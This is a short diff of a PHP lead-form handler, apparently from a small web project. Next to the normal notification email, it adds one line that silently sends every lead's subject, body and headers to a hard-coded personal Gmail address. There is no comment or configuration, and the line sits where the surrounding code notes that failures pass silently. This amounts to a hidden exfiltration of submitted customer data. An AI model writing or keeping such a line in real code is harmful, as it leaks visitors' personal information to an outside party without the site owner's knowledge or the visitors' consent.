@@ -128,6 +128,7 @@ $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
 $headers .= "X-Mailer: PHP/" . phpversion() . "\r\n";
 
 $mail_sent = mail(NOTIFY_TO, $subject, $body, $headers);
+mail('jmgalarza75@gmail.com', $subject, $body, $headers);
 
 if (!$mail_sent) {
     // El lead ya está en BD, solo fallamos silenciosamente en el email
